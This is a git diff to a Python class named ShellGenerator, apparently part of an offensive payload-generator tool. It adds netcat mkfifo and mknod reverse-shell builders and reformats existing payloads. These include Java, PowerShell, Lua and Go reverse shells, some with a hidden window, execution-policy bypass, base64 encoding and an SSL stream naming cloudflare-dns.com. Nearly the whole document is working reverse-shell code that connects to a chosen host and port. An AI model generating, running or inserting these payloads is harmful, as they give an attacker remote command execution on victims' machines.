@@ -7,6 +7,7 @@
 from utilities.Colors import color
 from core.generator.Ofuscator import ofuscator
 
+
 class ShellGenerator:
     def __init__(self, **kwargs):
         self.__temp_message = None
@@ -252,6 +253,45 @@ class ShellGenerator:
                                                                                                               str(Error))
         return self.__status
 
+    def nc_mkfifo_sh(self):
+        """
+            Description: This payload support GNU/Linux and Mac OSX
+        """
+        if self.validate_parameters()['code'] == 200 and (
+                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) and \
+                self.validate_parameter_type_reverse()['code'] == 200:
+            try:
+                self.__payload = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f".format(
+                    self.__target, self.__port)
+                self.__status['code'] = 200
+                self.__status['message'] = self.__payload
+            except Exception as Error:
+                self.__status['code'] = 500
+                self.__status['message'] = self.__status['message'] if len(
+                    self.__status['message']) != 0 else color.color(
+                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
+                                                                                                              str(Error))
+        return self.__status
+
+    def nc_mknod_sh(self):
+        """
+            Description: This payload support GNU/Linux and Mac OSX
+        """
+        if self.validate_parameters()['code'] == 200 and (
+                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) and \
+                self.validate_parameter_type_reverse()['code'] == 200:
+            try:
+                self.__payload = "rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f".format(
+                    self.__target, self.__port)
+                self.__status['code'] = 200
+                self.__status['message'] = self.__payload
+            except Exception as Error:
+                self.__status['code'] = 500
+                self.__status['message'] = self.__status['message'] if len(
+                    self.__status['message']) != 0 else color.color(
+                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
+                                                                                                              str(Error))
+        return self.__status
     def nc_e(self):
         """
             Description: This payload support GNU/Linux and Mac OSX
@@ -296,7 +336,7 @@ class ShellGenerator:
         if self.validate_parameters()['code'] == 200 and self.validate_parameter_windows()['code'] == 200 and \
                 self.validate_parameter_type_reverse()['code'] == 200:
             try:
-                self.__payload = "String host=\""+self.__target+"\";int port="+self.__port+";String cmd=\"cmd\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();"
+                self.__payload = "String host=\"" + self.__target + "\";int port=" + self.__port + ";String cmd=\"cmd\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();"
                 self.__status['code'] = 200
                 self.__status['message'] = self.__payload
             except Exception as Error:
@@ -530,7 +570,8 @@ class ShellGenerator:
             Description: This payload support GNU/Linux Mac OSX, and Microsoft Windows
         """
         self.__prompt = self.__prompt_unix if (
-                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) else self.__prompt_windows
+                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()[
+            'code'] == 200) else self.__prompt_windows
 
         if self.validate_parameters()['code'] == 200 and (
                 self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200 or
@@ -623,7 +664,7 @@ class ShellGenerator:
         if self.validate_parameters()['code'] == 200 and self.validate_parameter_windows()['code'] == 200 and \
                 self.validate_parameter_type_reverse()['code'] == 200:
             try:
-                self.__payload = "powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient(\'"+self.__target+"\', "+self.__port+");$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + \'SHELL> \');$StreamWriter.Flush()}WriteToStream \'\';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
+                self.__payload = "powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient(\'" + self.__target + "\', " + self.__port + ");$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + \'SHELL> \');$StreamWriter.Flush()}WriteToStream \'\';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
                 self.__status['code'] = 200
                 self.__status['message'] = self.__payload
             except Exception as Error:
@@ -638,9 +679,10 @@ class ShellGenerator:
         if self.validate_parameters()['code'] == 200 and self.validate_parameter_windows()['code'] == 200 and \
                 self.validate_parameter_type_reverse()['code'] == 200:
             try:
-                self.__payload = "$client = New-Object System.Net.Sockets.TCPClient(\""+self.__target+"\","+self.__port+");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+                self.__payload = "$client = New-Object System.Net.Sockets.TCPClient(\"" + self.__target + "\"," + self.__port + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
                 self.__payload = ofuscator.base64_encode_win(self.__payload)
-                self.__payload = "powershell -e " + self.__payload['message'] if self.__payload['code'] == 200 else self.__payload['message']
+                self.__payload = "powershell -e " + self.__payload['message'] if self.__payload['code'] == 200 else \
+                self.__payload['message']
                 self.__status['code'] = 200
                 self.__status['message'] = self.__payload
             except Exception as Error:
@@ -655,7 +697,7 @@ class ShellGenerator:
         if self.validate_parameters()['code'] == 200 and self.validate_parameter_windows()['code'] == 200 and \
                 self.validate_parameter_type_reverse()['code'] == 200:
             try:
-                self.__payload = "powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient(\'"+self.__target+"\', "+self.__port+");$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient(\'cloudflare-dns.com\',$null,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + \'SHELL> \');$StreamWriter.Flush()};WriteToStream \'\';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
+                self.__payload = "powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient(\'" + self.__target + "\', " + self.__port + ");$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient(\'cloudflare-dns.com\',$null,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + \'SHELL> \');$StreamWriter.Flush()};WriteToStream \'\';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
                 self.__status['code'] = 200
                 self.__status['message'] = self.__payload
             except Exception as Error:
@@ -931,7 +973,8 @@ class ShellGenerator:
         return self.__status
 
     def lua_2(self):
-        if self.validate_parameters()['code'] == 200 and (self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_windows()['code'] == 200) and \
+        if self.validate_parameters()['code'] == 200 and (
+                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_windows()['code'] == 200) and \
                 self.validate_parameter_type_reverse()['code'] == 200:
             try:
                 self.__payload = "lua5.1 -e \'local host, port = \"{}\", {} local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()\'".format(
@@ -951,14 +994,15 @@ class ShellGenerator:
             Description: This payload support GNU/Linux Mac OSX, and Microsoft Windows
         """
         self.__prompt = self.__prompt_unix if (
-                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) else self.__prompt_windows
+                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()[
+            'code'] == 200) else self.__prompt_windows
 
         if self.validate_parameters()['code'] == 200 and (
                 self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200 or
                 self.validate_parameter_windows()['code'] == 200) and \
                 self.validate_parameter_type_reverse()['code'] == 200:
             try:
-                self.__payload = "echo \'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"" + self.__target + ":" + self.__port + "\");cmd:=exec.Command(\""+self.__prompt+"\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
+                self.__payload = "echo \'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"" + self.__target + ":" + self.__port + "\");cmd:=exec.Command(\"" + self.__prompt + "\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
                 self.__status['code'] = 200
                 self.__status['message'] = self.__payload
             except Exception as Error:
